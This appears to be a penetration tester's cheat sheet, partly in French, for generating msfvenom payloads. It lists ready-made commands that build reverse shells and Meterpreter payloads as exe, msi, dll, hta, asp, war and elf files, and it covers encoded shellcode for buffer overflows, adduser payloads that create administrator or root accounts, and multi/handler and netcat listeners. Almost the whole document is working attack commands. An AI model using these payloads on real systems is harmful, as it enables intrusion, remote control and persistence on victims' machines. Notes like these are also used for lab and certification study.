# Msfvenom


## Windows - x86 - exe

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.233 LPORT=21 -f exe -o binary.exe

## Windows - x64 - exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.233 LPORT=21 -f exe -o binary.exe

## Windows - x64- .msi

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o reverse.msi

## Windows  - .dll

msfvenom -p windows/shell_reverse_tcp -f dll -o shell.dll LHOST=192.168.49.184 LPORT=445

## Windows - .hta

sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.138 LPORT=4444 -f hta-psh -o evil.hta

## Windows - .asp

Useful when the webserver is Microsoft IIS. Also, try extension .aspx and .aspx-exe

msfvenom -p windows/shell_reverse_tcp -f asp LHOST=10.10.16.8 LPORT=4444 -o reverse-shell.asp

## .war (java/jsp)

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.2 LPORT=80 -f war > shell.war

## Linux-x86 - elf

msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.151 LPORT=80 -f elf -o shell.elf

## Linux - x64-elf-so

msfvenom -p linux/x64/shell_reverse_tcp -f elf-so -o utils.so LHOST=192.168.130.21 LPORT=80

## Pour les Buffers Overflow

## Windows - .c

The flag -e is to specify the encoding.

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.218 LPORT=80 EXITFUNC=thread -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" -f c -e x86/alpha_mixed

## Others payloads

```
cmd/windows/adduser # Create a new user and add them to local administration group
linux/x86/adduser   # Create a new user with UID 0
windows/adduser     # Create a new user and add them to local administration group
```
















### Msfvenom

See: https://www.offensive-security.com/metasploit-unleashed/Msfvenom/

https://liberty-shell.com/sec/2018/02/10/msfv/


[# Generating Reverse Shell using Msfvenom (One Liner Payload)](https://www.hackingarticles.in/generating-reverse-shell-using-msfvenom-one-liner-payload/)

**Generation Commands**


**Linux**
**Staged Meterpreter**
msfvenom **-p** linux/x86/meterpreter/reverse_tcp **LHOST**=YourIP **LPORT**=YourPort **-f** elf  shell-meterp.elf


**Inline Meterpreter**
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=YourIP LPORT=YourPort -f elf  santas.elf




**Windows**
**Executable with Meterpreter**
msfvenom **-p** windows/meterpreter/reverse_tcp **LHOST**=YourIP **LPORT**=YourPort **-f** exe  shell-meterp.exe


**Executable with Windows cmd**
msfvenom **-p** windows/shell/reverse_tcp **LHOST**=YourIP **LPORT**=YourPort **-f** exe  shell-cmd.exe


**Windows DLL with Windows cmd**
msfvenom **-p** windows/shell/reverse_tcp **LHOST**=YourIP **LPORT**=YourPort **-f** dll  shell-cmd.dll


**Execute Windows Command**
- generate dll named shell32.dll that will pop calc when ran
msfvenom **-f** dll **-p** windows/exec **CMD**=**"C:windowssystem32calc.exe" -o** shell32.dll


**Languages**
**Python**
msfvenom **-p** cmd/unix/reverse_python **LHOST**=YourIP **LPORT**=YourPort **-f** raw


**Powershell**
msfvenom **-p** windows/powershell_reverse_tcp **LHOST**=YourIP **LPORT**=YourPort **-f** raw


**Usage Tips**


**Payload Options**
msfvenom **-p** [payload] **--payload-options**
msfvenom **-p** windows/meterpreter/reverse_tcp **--payload-options**


**List encoders**
root@kali:/# msfvenom **-l** encoders
Encoding you payload in x86/shikata_ga_nai is great, but sometimes your shell code has bad chars and shikata_gi_nai may throw an error on generation. Using this command you should be able to find an encoder that will fit your parameters.
**Create Listener**
In Metasploit set Listener for
**Windows Meterpreter**
use exploit/multi/handler
**set** payload windows/x64/meterpreter/reverse_tcp


In Metasploit set Listener for
**Linux Meterpreter**
use exploit/multi/handler
**set** payload linux/x86/meterpreter/reverse_tcp
Set
**Netcat Listener**
nc **-lvp** YourPort


**Formats**
You can generate the shell output in two different formats:
**Executable**
or
**Transform**. It will depend on the scenario as to which one you'll choose.
**Executable**
- It's own executable shell with an extension .elf .exe .py .php etc. Eg: You have an unstable non-interactive low priv shell and you want to get something more stable and efficient on a vulnerable windows machine. You'd generate the payload as an .exe, create a listener, upload and execute.
**Transform**
- Raw shellcode that can be pasted into an existing exploit. The transform format will depend on what that exploit is written in. Eg: You need to create shell code to paste into your code execution exploit that's ultimately ran by a vulnerable public facing web app in javascript. To format your shellcode, you may want to use:
**-f js_le**
(java script_little endian)
List of formats...
root@kali:/# msfvenom **--help-formats**
Executable formats








asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, war
Transform formats








bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript


*À partir de l'adresse https://liberty-shell.com/sec/2018/02/10/msfv/*




msfvenom -p windows/shell_reverse_tcp lhost=192.168.119.191 lport=443 -f exe -o shell.exe -e x86/shikata_ga_nai -i 12



# known issues
## MSF 6 - SMB
Need :
```
set SMB::AlwaysEncrypt false  
set SMB::ProtocolVersion 1
```